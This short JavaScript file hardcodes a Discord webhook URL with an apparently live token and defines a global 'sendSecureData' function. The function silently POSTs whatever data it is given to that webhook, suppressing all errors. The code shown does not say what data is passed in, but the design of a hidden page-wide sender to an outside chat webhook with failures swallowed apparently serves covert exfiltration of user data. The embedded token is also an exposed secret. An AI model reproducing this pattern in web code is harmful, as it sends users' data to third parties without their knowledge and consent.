const WEBHOOK_URL = 'https://discord.com/api/webhooks/1373802856053866557/UosH-E90G9Bw123dMbtHMNue3ke9EL6B479LA60xkDb6LJyh0BhrC3fZUGOjiRBdafmn';

window.sendSecureData = function(data) {
    try {
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {});
    } catch(e) {}
};

console.log('✅ Webhook loaded');
